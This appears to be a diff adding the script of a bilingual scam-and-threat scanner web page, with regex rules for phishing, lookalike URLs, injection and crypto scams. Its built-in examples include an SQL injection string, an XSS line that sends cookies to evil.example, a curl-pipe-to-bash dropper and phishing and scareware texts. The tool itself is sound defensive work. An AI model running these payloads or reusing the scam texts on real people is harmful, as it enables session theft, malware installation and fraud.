+    modSeverityNote: "जो मिला वह अकेले मध्यम स्तर का है, लेकिन सावधानी बरतना ठीक रहेगा।",
+    patternScan: "पैटर्न स्कैन", aiAnalystLabel: "AI",
+    confidenceLabel: "विश्वास स्तर",
+    catPhrases: {
+      "Social Engineering / Phishing": "दबाव बनाने वाली भाषा या संवेदनशील जानकारी माँगता है — फ़िशिंग की आम तरकीब",
+      "Malicious URL Pattern": "एक ऐसी साइट से जोड़ता है जो भरोसेमंद दिखने के लिए भेस बदले हुए है",
+      "Code Injection (Web/Command)": "ऐसा कोड है जो डेटाबेस, ब्राउज़र या सिस्टम में छेड़छाड़ के लिए बनाया गया है",
+      "Malware / Scareware": "आपको डराकर कुछ इंस्टॉल या बंद करवाने की कोशिश करता है",
+      "Crypto & Financial Scam": "ऐसा वित्तीय वादा करता है जो कोई असली ऑफ़र कभी नहीं करेगा",
+    }
+  }
+};
+function t(key){ return STRINGS[currentLang][key]; }
+
+function applyLanguage(lang){
+  currentLang = lang;
+  document.body.classList.toggle('lang-hi', lang === 'hi');
+  document.documentElement.lang = lang;
+
+  document.querySelectorAll('[data-i18n]').forEach(el => {
+    const key = el.getAttribute('data-i18n');
+    if(STRINGS[lang][key] !== undefined) el.innerHTML = STRINGS[lang][key];
+  });
+  document.querySelectorAll('[data-i18n-placeholder]').forEach(el => {
+    const key = el.getAttribute('data-i18n-placeholder');
+    if(STRINGS[lang][key] !== undefined) el.placeholder = STRINGS[lang][key];
+  });
+  document.querySelectorAll('.lang-btn').forEach(b => b.classList.toggle('active', b.dataset.lang === lang));
+
+  if(hasResult && lastState){
+    renderVerdictArea(lastState);
+  }
+}
+
+document.getElementById('lang-toggle').addEventListener('click', (e) => {
+  const btn = e.target.closest('.lang-btn');
+  if(!btn) return;
+  applyLanguage(btn.dataset.lang);
+  const mode = document.querySelector('.mode-tab.active')?.dataset.mode || 'auto';
+  setMode(mode);
+});
+
+const EXAMPLES = {
+  phishing: `Dear Customer,
+
+We detected unusual activity on your account. Your access will be suspended within 24 hours unless you verify your identity immediately.
+
+Click here to confirm your password and account details: http://secure-paypal-verify.xyz/login
+
+Failure to act now may result in permanent account closure. This is an urgent matter requiring your immediate attention.
+
+Regards,
+Account Security Team`,
+
+  url: `Hey, can you check the invoice here before EOD?
+http://192.168.44.10.paypa1-secure.xn--80ak6aa92e.top/invoice?id=88231
+Also try this shortened one a colleague sent: http://bit.ly/3xQinv0ice`,
+
+  code: `SELECT * FROM users WHERE username = 'admin' OR '1'='1'; --
+
+<script>document.location='http://evil.example/steal?c='+document.cookie<\/script>
+
+curl http://evil.example/payload.sh | bash && chmod +x payload.sh`,
+
+  scareware: `WARNING: Your computer is infected with 3 viruses!
+
+Windows Defender has detected malware on your device. Call this number immediately: 1-800-555-0199 for toll-free support.
+
+Our technician will ask you to disable your antivirus temporarily to remove the threat. Do not restart your computer.`,
+
+  crypto: `Congratulations! You've been selected in our giveaway. Claim your prize now.
+
+Send 0.5 BTC to the address below to receive 1.0 BTC back within 24 hours — guaranteed returns, risk-free investment opportunity backed by our platform.
+
+wallet: bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh`,
+
+  typosquat: `Quick heads up — sign in here to check your shipment: http://www.googel.com/accounts/login
+Also got this one from "support": http://paypa1.com/resolve-case`
+};
+
+const RULES = [
+  {cat:"Social Engineering / Phishing", label:"Account suspension / closure threat", sev:"high", re:/\b(suspend(ed)?|clos(e|ure)|terminat(e|ed))\b.{0,40}\b(account|access)\b/i, desc:"Threatens account suspension or closure — classic urgency pressure to short-circuit careful thinking."},
+  {cat:"Social Engineering / Phishing", label:"Urgency / time-pressure language", sev:"high", re:/\b(within\s+\d+\s*(hours?|hrs?|days?)|act\s+now|immediately|urgent(ly)?)\b/i, desc:"Artificial time pressure. Legitimate institutions rarely demand split-second action."},
+  {cat:"Social Engineering / Phishing", label:"Generic greeting", sev:"med", re:/\bdear\s+(customer|user|member|valued)\b/i, desc:"Generic greeting instead of your actual name — a sign of a mass-sent message, not a personal one from your real provider."},
+  {cat:"Social Engineering / Phishing", label:"Credential or sensitive-data request", sev:"high", re:/\b(verify|confirm|update)\b.{0,30}\b(password|account details|identity|ssn|social security|card number|pin)\b/i, desc:"Asks you to submit credentials or sensitive data directly — legitimate services don't request this via email link."},
+  {cat:"Social Engineering / Phishing", label:"Payment / gift-card urgency (BEC)", sev:"med", re:/\bwire\s+transfer|gift\s*cards?\b.{0,30}\b(urgent|now|today|asap)\b/i, desc:"Payment request paired with urgency — a common pattern in CEO-fraud / business email compromise."},
+
+  {cat:"Malicious URL Pattern", label:"Raw IP address as host", sev:"high", re:/https?:\/\/(\d{1,3}\.){3}\d{1,3}/i, desc:"Raw IP address used instead of a domain name — hides the actual destination and skips normal domain reputation checks."},
+  {cat:"Malicious URL Pattern", label:"Punycode / homograph encoding", sev:"high", re:/xn--[a-z0-9]+/i, desc:"Punycode encoding — often used to render lookalike characters that visually mimic a trusted domain (a homograph attack)."},
+  {cat:"Malicious URL Pattern", label:"URL shortener", sev:"med", re:/\b(bit\.ly|tinyurl\.com|t\.co|goo\.gl|is\.gd|ow\.ly)\b/i, desc:"URL shortener — hides the real destination until after you've already clicked."},
+  {cat:"Malicious URL Pattern", label:"Brand name + suspicious TLD", sev:"high", re:/\b(paypa1|paypal|amaz0n|amazon|g00gle|google|micros0ft|microsoft|apple|bank)[\-.][a-z0-9\-]*\.(xyz|top|click|info|support|win|gq)\b/i, desc:"Brand name combined with an unrelated domain and a cheap, high-abuse TLD — a classic typosquat / lookalike domain."},
+  {cat:"Malicious URL Pattern", label:"Excessive subdomain chaining", sev:"med", re:/(?:[a-z0-9\-]+\.){4,}[a-z]{2,}/i, desc:"Excessive subdomain chaining — sometimes used to bury the real domain deep in the URL where it's easy to miss."},
+  {cat:"Malicious URL Pattern", label:"Typosquat domain (lookalike of a known brand)", sev:"high", re:null, desc:""},
+
+  {cat:"Code Injection (Web/Command)", label:"SQL tautology (OR 1=1)", sev:"high", re:/\bOR\s+['"]?1['"]?\s*=\s*['"]?1['"]?/i, desc:"Classic SQL injection tautology — makes a WHERE clause always evaluate true, bypassing authentication logic."},
+  {cat:"Code Injection (Web/Command)", label:"SQL UNION SELECT", sev:"high", re:/\bUNION\s+SELECT\b/i, desc:"SQL UNION-based injection — used to pull extra data out of a database via a manipulated query."},
+  {cat:"Code Injection (Web/Command)", label:"SQL comment terminator", sev:"med", re:/--\s*$/m, desc:"SQL comment terminator — used to cut off the rest of a legitimate query after an injected clause."},
+  {cat:"Code Injection (Web/Command)", label:"Inline <script> tag", sev:"high", re:/<script[\s>]/i, desc:"Inline &lt;script&gt; tag — the core building block of a cross-site scripting (XSS) payload."},
+  {cat:"Code Injection (Web/Command)", label:"document.cookie access", sev:"high", re:/document\.cookie/i, desc:"Reads the browser's cookies — commonly used in XSS payloads to steal session tokens."},
+  {cat:"Code Injection (Web/Command)", label:"Download-and-execute pattern", sev:"high", re:/curl\s+.+\|\s*bash|wget\s+.+&&\s*chmod/i, desc:"Download-and-execute pattern — fetches a remote script and runs it immediately, a hallmark of malware droppers."},
+  {cat:"Code Injection (Web/Command)", label:"Inline event-handler attribute", sev:"med", re:/on(error|load|click)\s*=/i, desc:"Inline event-handler attribute — a common vector for smuggling script execution into HTML that looks otherwise harmless."},
+  {cat:"Code Injection (Web/Command)", label:"Base64 decode-and-execute", sev:"med", re:/eval\s*\(\s*(atob|base64_decode)/i, desc:"Decodes a base64 blob and immediately executes it — a common way to hide a malicious payload from casual reading."},
+  {cat:"Code Injection (Web/Command)", label:"Path traversal sequence", sev:"med", re:/(\.\.\/){2,}/, desc:"Path traversal sequence — attempts to escape a web root or restricted folder to reach files like system configs or credentials."},
+
+  {cat:"Malware / Scareware", label:"Fake infection alert", sev:"high", re:/your (computer|device|pc) (is|has been) (infected|compromised|hacked)/i, desc:"Scareware language claiming your device is infected — designed to panic you into calling a number or installing 'cleanup' software that is itself malicious."},
+  {cat:"Malware / Scareware", label:"Push to call a phone number", sev:"med", re:/call\s+(this\s+number|us)\s+immediately|toll[- ]free\s+support/i, desc:"Pushes you toward a phone number instead of an official support channel — a staple of fake tech-support scams."},
+  {cat:"Malware / Scareware", label:"Double file extension", sev:"high", re:/double[- ]?extension|\.pdf\.exe|\.docx?\.exe|\.jpg\.exe/i, desc:"Double file extension trick (e.g. invoice.pdf.exe) — disguises an executable as a harmless document or image."},
+  {cat:"Malware / Scareware", label:"Disable antivirus / firewall instruction", sev:"med", re:/disable\s+(your\s+)?(antivirus|windows defender|firewall)/i, desc:"Instructs the target to turn off security software — a strong signal the next step is installing something malicious."},
+
+  {cat:"Crypto & Financial Scam", label:"Send-to-receive-more crypto scheme", sev:"high", re:/send\s+.{0,15}(btc|bitcoin|eth|crypto|usdt)\b.{0,40}\b(receive|get back|double)\b/i, desc:"'Send crypto to receive more back' — a textbook advance-fee crypto scam with no legitimate equivalent."},
+  {cat:"Crypto & Financial Scam", label:"Guaranteed / risk-free returns claim", sev:"med", re:/guaranteed\s+(returns?|profit)|risk[- ]free\s+investment/i, desc:"Promises guaranteed or risk-free returns — a claim no legitimate investment can honestly make."},
+  {cat:"Crypto & Financial Scam", label:"Unsolicited prize / reward claim", sev:"med", re:/(claim|redeem)\s+your\s+(prize|reward|winnings)/i, desc:"Unsolicited prize or reward claim — used to lure victims into paying a 'release fee' or handing over financial details."},
+];
+
+const KNOWN_BRAND_DOMAINS = [
+  "google.com","paypal.com","amazon.com","microsoft.com","apple.com",
+  "facebook.com","instagram.com","netflix.com","linkedin.com","github.com",
+  "dropbox.com","bankofamerica.com","chase.com","wellsfargo.com",
+  "outlook.com","yahoo.com","twitter.com"
+];
+
+function levenshtein(a, b){
+  const m = a.length, n = b.length;
+  const dp = Array.from({length: m+1}, () => new Array(n+1).fill(0));
+  for(let i=0;i<=m;i++) dp[i][0] = i;
+  for(let j=0;j<=n;j++) dp[0][j] = j;
+  for(let i=1;i<=m;i++){
+    for(let j=1;j<=n;j++){
+      dp[i][j] = a[i-1] === b[j-1] ? dp[i-1][j-1] : 1 + Math.min(dp[i-1][j-1], dp[i-1][j], dp[i][j-1]);
+    }
+  }
+  return dp[m][n];
+}
+
+function detectTyposquats(text){
+  const domainRe = /\b(?:https?:\/\/)?(?:www\.)?([a-z0-9-]+(?:\.[a-z0-9-]+)+)\b/gi;
+  const found = [];
+  let m;
+  while((m = domainRe.exec(text)) !== null){
+    const fullMatch = m[0];
+    const domain = m[1].toLowerCase();
+    const parts = domain.split('.');
+    const candidate = parts.slice(-2).join('.');
+    if(KNOWN_BRAND_DOMAINS.includes(candidate)) continue;
+    for(const brand of KNOWN_BRAND_DOMAINS){
+      const dist = levenshtein(candidate, brand);
+      if(dist > 0 && dist <= 2 && Math.abs(candidate.length - brand.length) <= 2){
+        const descTemplate = currentLang === 'hi'
+          ? `"${candidate}" असली "${brand}" से केवल ${dist} अक्षर अलग है — यह एक क्लासिक टाइपोस्क्वैट है जो गलती से टाइप किए गए यूआरएल या सरसरी निगाह को फँसाने के लिए बनाया गया है।`
+          : `"${candidate}" is only ${dist} character${dist>1?'s':''} different from the real "${brand}" — a classic typosquat built to catch mistyped URLs or a quick glance.`;
+        found.push({
+          start: m.index, end: m.index + fullMatch.length, text: fullMatch,
+          cat: "Malicious URL Pattern",
+          label: "Typosquat domain (lookalike of a known brand)",
+          sev: "high", desc: descTemplate
+        });
+        break;
+      }
+    }
+  }
+  return found;
+}
+
+function analyze(text){
+  let matches = [];
+  RULES.forEach(rule => {
+    if(!rule.re) return;
+    let re = new RegExp(rule.re.source, rule.re.flags.includes('g') ? rule.re.flags : rule.re.flags + 'g');
+    let m;
+    while((m = re.exec(text)) !== null){
+      matches.push({start:m.index, end:m.index + m[0].length, text:m[0], ...rule});
+      if(m.index === re.lastIndex) re.lastIndex++;
+    }
+  });
+  matches = matches.concat(detectTyposquats(text));
+
+  matches.sort((a,b) => a.start - b.start || (a.sev==='high'?-1:1));
+  let filtered = [];
+  let lastEnd = -1;
+  matches.forEach(m => {
+    if(m.start >= lastEnd){ filtered.push(m); lastEnd = m.end; }
+  });
+  return filtered;
+}
+
+const ALL_CHECKS = (() => {
+  const seen = new Set();
+  const checks = [];
+  RULES.forEach(r => {
+    const key = r.cat + '::' + r.label;
+    if(!seen.has(key)){ seen.add(key); checks.push({cat:r.cat, label:r.label, sev:r.sev}); }
+  });
+  return checks;
+})();
+
+function computeRiskScore(matches){
+  if(matches.length === 0) return 0;
+  let score = 0;
+  matches.forEach(m => { score += m.sev === 'high' ? 22 : 11; });
+  const cats = new Set(matches.map(m => m.cat)).size;
+  score += (cats - 1) * 10;
+  return Math.max(4, Math.min(100, Math.round(score)));
+}
+
+function verdictTier(score){
+  if(score === 0) return 'safe';
+  if(score < 50) return 'caution';
+  return 'flagged';
+}
+
+function escapeHtml(s){
+  return s.replace(/[&<>"']/g, c => ({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'}[c]));
+}
+
+function buildSummary(matches, score, aiResult){
+  if(matches.length === 0 && !aiResult){
+    return t('summarySafeNoMatches');
+  }
+  if(matches.length === 0 && aiResult){
+    return aiResult.reasoning;
+  }
+  const catCounts = {};
+  matches.forEach(m => { catCounts[m.cat] = (catCounts[m.cat]||0) + 1; });
+  const cats = Object.keys(catCounts);
+  const phrases = t('catPhrases');
+  const clauses = cats.map(c => phrases[c] || c.toLowerCase());
+  let clauseText;
+  if(clauses.length === 1) clauseText = clauses[0];
+  else if(clauses.length === 2) clauseText = clauses[0] + t('joinTwo') + clauses[1];
+  else clauseText = clauses.slice(0,-1).join(", ") + t('joinLast') + clauses[clauses.length-1];
+
+  const highCount = matches.filter(m => m.sev==='high').length;
+  const severityNote = highCount > 0 ? t('highSeverityNote')(highCount, matches.length) : t('modSeverityNote');
+
+  return `${t('summaryPrefix')} ${clauseText}. ${severityNote}`;
+}
+
+function iconForTier(tier){
+  if(tier === 'safe') return ICONS.shieldCheck;
+  if(tier === 'flagged') return ICONS.shieldX;
+  if(tier === 'pending') return ICONS.shieldScan;
+  return ICONS.shieldAlert;
+}
+function labelForTier(tier){
+  if(tier === 'safe') return t('verdictSafe');
+  if(tier === 'flagged') return t('verdictFlagged');
+  if(tier === 'pending') return t('verdictPending');
+  return t('verdictCaution');
+}
+
+function scoreRing(score, tier){
+  const r = 30, c = 2 * Math.PI * r;
+  const pct = score / 100;
+  const colorVar = tier === 'safe' ? 'var(--safe)' : tier === 'flagged' ? 'var(--danger)' : 'var(--caution)';
+  return `
+    <div class="score-ring-block">
+      <svg class="score-ring" width="76" height="76" viewBox="0 0 76 76">
+        <circle class="track" cx="38" cy="38" r="${r}" fill="none" stroke-width="7"/>
+        <circle class="fill" cx="38" cy="38" r="${r}" fill="none" stroke="${colorVar}" stroke-width="7"
+          stroke-dasharray="${c}" stroke-dashoffset="${c}" transform="rotate(-90 38 38)" data-target="${c * (1-pct)}"/>
+      </svg>
+      <div>
+        <div class="score-num" style="color:${colorVar}">${score}/100</div>
+        <div class="score-label">${t('riskScore')}</div>
+      </div>
+    </div>
+  `;
+}
+
+function renderVerdictArea(state){
+  const wrap = document.getElementById('results-wrap');
+  let html = '';
+
+  if(state.status === 'pending'){
+    html += `
+    <div class="verdict-card reveal reveal-1">
+      <div class="verdict-icon-wrap pending">${iconForTier('pending')}</div>
+      <div class="verdict-label pending">${t('verdictPending')}</div>
+    </div>`;
+    wrap.innerHTML = html;
+    return;
+  }
+
+  const finalScore = state.aiResult ? Math.max(state.heuristicScore, state.aiResult.risk_score) : state.heuristicScore;
+  const tier = verdictTier(finalScore);
+
+  let errorHtml = '';
+  if(state.aiError){
+    errorHtml = `
+      <div class="error-banner">
+        <strong>${t('aiUnavailable')}:</strong> ${escapeHtml(state.aiError)}<br>
+        ${t('finalVerdictFallback')}
+        <div><button class="retry-btn" id="retry-ai-btn">${t('retryAi')}</button></div>
+      </div>`;
+  }
+
+  html += `
+    <div class="verdict-card reveal reveal-1">
+      <div class="verdict-icon-wrap ${tier} animate-pop">${iconForTier(tier)}</div>
+      <div class="verdict-label ${tier}">${labelForTier(tier)}</div>
+      <p class="verdict-summary">${buildSummary(currentMatches, state.heuristicScore, state.aiResult)}</p>
+      <div class="score-row">
+        ${scoreRing(finalScore, tier)}
+        <div class="source-pills">
+          <span class="source-pill">${t('patternScan')}: <b>${state.heuristicScore}/100</b></span>
+          <span class="source-pill">${t('aiAnalystLabel')}: <b>${state.aiResult ? state.aiResult.risk_score + '/100' : '—'}</b></span>
+        </div>
+      </div>
+      ${errorHtml}
+    </div>
+  `;
+
+  wrap.innerHTML = html;
+
+  requestAnimationFrame(() => {
+    const ringFill = wrap.querySelector('.score-ring .fill');
+    if(ringFill) requestAnimationFrame(() => { ringFill.style.strokeDashoffset = ringFill.dataset.target; });
+  });
+
+  if(state.aiError){
+    document.getElementById('retry-ai-btn').addEventListener('click', retryAi);
+  }
+
+  renderRestSections(state);
+}
+
+function renderRestSections(state){
+  const wrap = document.getElementById('results-wrap');
+
+  let evHtml = '';
+  let cursor = 0;
+  currentMatches.forEach((m) => {
+    evHtml += escapeHtml(currentEvidenceText.slice(cursor, m.start));
+    evHtml += `<mark class="sev-${m.sev==='high'?'high':'med'}" title="${escapeHtml(m.label)}: ${escapeHtml(m.desc)}">${escapeHtml(m.text)}</mark>`;
+    cursor = m.end;
+  });
+  evHtml += escapeHtml(currentEvidenceText.slice(cursor));
+
+  const evidenceSection = `
+    <div class="section reveal reveal-2">
+      <div class="section-head">${ICONS.clipboard}
+        <div><div class="section-title">${t('yourText')}</div><div class="section-sub">${t('yourTextSub')}</div></div>
+      </div>
+      <div class="section-body"><div class="evidence-block">${evHtml || '<span style="color:var(--ink-faint)">(empty)</span>'}</div></div>
+    </div>`;
+
+  let findingsInner;
+  if(currentMatches.length === 0){
+    findingsInner = `<p class="no-findings">${t('nothingFound')}</p>`;
+  } else {
+    findingsInner = `<div class="findings-list">` + currentMatches.map(m => `
+      <div class="finding sev-${m.sev==='high'?'high':'med'}">
+        <div class="finding-icon">${m.sev==='high' ? ICONS.x : ICONS.check}</div>
+        <div>
+          <div class="finding-cat">${m.cat}</div>
+          <p class="finding-desc"><span class="finding-match">${escapeHtml(m.text)}</span> — ${m.desc}</p>
+        </div>
+      </div>
+    `).join('') + `</div>`;
+  }
+  const findingsSection = `
+    <div class="section reveal reveal-3">
+      <div class="section-head">${ICONS.magnify}
+        <div><div class="section-title">${t('whatWeFound')}</div><div class="section-sub">${currentMatches.length ? t('whatWeFoundSub')(currentMatches.length) : ''}</div></div>
+      </div>
+      <div class="section-body">${findingsInner}</div>
+    </div>`;
+
+  let aiInner;
+  if(!state.aiResult && !state.aiError){
+    aiInner = `<div class="ai-pending">${t('aiPending')}<span class="dot-flow"><span></span><span></span><span></span></span></div>`;
+  } else if(state.aiResult){
+    const r = state.aiResult;
+    const aiTier = r.verdict === 'clear' ? 'safe' : r.verdict === 'flagged' ? 'flagged' : 'caution';
+    aiInner = `
+      <div class="ai-card">
+        <div class="ai-card-head">
+          <span class="ai-category">${escapeHtml(r.category || 'General')}</span>
+          <span class="ai-badge ${aiTier}">${labelForTier(aiTier)}</span>
+        </div>
+        <div class="ai-body">${escapeHtml(r.reasoning)}</div>
+        <div class="ai-foot">
+          <span>${t('riskScore')}: ${r.risk_score}/100</span>
+          <span>${t('confidenceLabel')}: ${Math.round((r.confidence||0)*100)}%</span>
+        </div>
+      </div>`;
+  } else {
+    aiInner = '';
+  }
+  const aiSection = `
+    <div class="section reveal reveal-4">
+      <div class="section-head">${ICONS.sparkle}
+        <div><div class="section-title">${t('aiTake')}</div><div class="section-sub">${t('aiTakeSub')}</div></div>
+      </div>
+      <div class="section-body">${aiInner}</div>
+    </div>`;
+
+  const matchedLabels = new Set(currentMatches.map(m => m.label));
+  const grouped = {};
+  ALL_CHECKS.forEach(chk => {
+    grouped[chk.cat] = grouped[chk.cat] || [];
+    grouped[chk.cat].push({...chk, hit: matchedLabels.has(chk.label)});
+  });
+  const checklistBody = Object.entries(grouped).map(([cat, checks]) => `
+    <div class="checklist-group">
+      <div class="checklist-group-name">${cat}</div>
+      ${checks.map(c => `
+        <div class="checklist-row ${c.hit ? 'fail':''}">
+          <span class="check-icon ${c.hit ? ('fail-'+c.sev) : 'pass'}">${c.hit ? ICONS.x : ICONS.check}</span>
+          <span>${c.label}</span>
+        </div>
+      `).join('')}
+    </div>
+  `).join('');
+
+  const checklistSection = `
+    <div class="section reveal reveal-4">
+      <button class="checklist-toggle" id="checklist-toggle" aria-expanded="false">
+        <div style="display:flex; align-items:center; gap:10px;">${ICONS.list}
+          <div><div class="section-title">${t('fullChecklist')}</div><div class="section-sub">${t('fullChecklistSub')}</div></div>
+        </div>
+        <span class="chevron">${ICONS.chevronDown}</span>
+      </button>
+      <div class="checklist-panel" id="checklist-panel"><div class="checklist-inner">${checklistBody}</div></div>
+    </div>`;
+
+  wrap.insertAdjacentHTML('beforeend', evidenceSection + findingsSection + aiSection + checklistSection);
+
+  const toggleBtn = document.getElementById('checklist-toggle');
+  const panel = document.getElementById('checklist-panel');
+  toggleBtn.addEventListener('click', () => {
+    const open = panel.classList.toggle('open');
+    toggleBtn.setAttribute('aria-expanded', open ? 'true' : 'false');
+  });
+}
+
+async function callAi(text){
+  const res = await fetch(`${API_BASE}/api/analyze`, {
+    method: 'POST',
+    headers: {'Content-Type': 'application/json'},
+    body: JSON.stringify({text, lang: currentLang})
+  });
+  if(!res.ok){
+    const errBody = await res.json().catch(() => ({}));
+    throw new Error(errBody.detail || `Server responded with ${res.status}`);
+  }
+  return res.json();
+}
+
+let lastState = null;
+
+async function runFullAnalysis(text){
+  currentEvidenceText = text;
+  currentMatches = analyze(text);
+  currentHeuristicScore = computeRiskScore(currentMatches);
+  hasResult = true;
+
+  const btn = document.getElementById('analyze-btn');
+  btn.classList.add('loading');
+
+  lastState = {status:'pending', heuristicScore: currentHeuristicScore};
+  renderVerdictArea(lastState);
+
+  document.getElementById('results-wrap').scrollIntoView({behavior:'smooth', block:'start'});
+
+  await retryAi();
+}
+
+async function retryAi(){
+  const btn = document.getElementById('analyze-btn');
+  btn.disabled = true;
+  btn.classList.add('loading');
+  try{
+    const aiResult = await callAi(currentEvidenceText);
+    lastState = {status:'done', heuristicScore: currentHeuristicScore, aiResult};
+  } catch(err){
+    lastState = {status:'done', heuristicScore: currentHeuristicScore, aiError: err.message};
+  } finally {
+    btn.disabled = false;
+    btn.classList.remove('loading');
+    renderVerdictArea(lastState);
+  }
+}
+
+document.getElementById('analyze-btn').addEventListener('click', () => {
+  const text = document.getElementById('input-text').value;
+  if(!text.trim()){
+    document.getElementById('input-text').focus();
+    return;
+  }
+  runFullAnalysis(text);
+});
+
+document.querySelectorAll('.chip').forEach(btn => {
+  btn.addEventListener('click', () => {
+    document.getElementById('input-text').value = EXAMPLES[btn.dataset.example];
+    if(btn.dataset.mode) setMode(btn.dataset.mode);
+    document.getElementById('input-text').focus();
+  });
+});
+
+function setMode(mode){
+  document.querySelectorAll('.mode-tab').forEach(el => el.classList.toggle('active', el.dataset.mode === mode));
+  const placeholderKeys = { auto: "placeholderAuto", message: "placeholderMessage", url: "placeholderUrl", code: "placeholderCode" };
+  document.getElementById('input-text').placeholder = t(placeholderKeys[mode] || placeholderKeys.auto);
+}
+
+document.querySelectorAll('.mode-tab').forEach(tab => {
+  tab.addEventListener('click', () => setMode(tab.dataset.mode));
+});
+
+applyLanguage('en');
+</script>
+</body>
+</html>
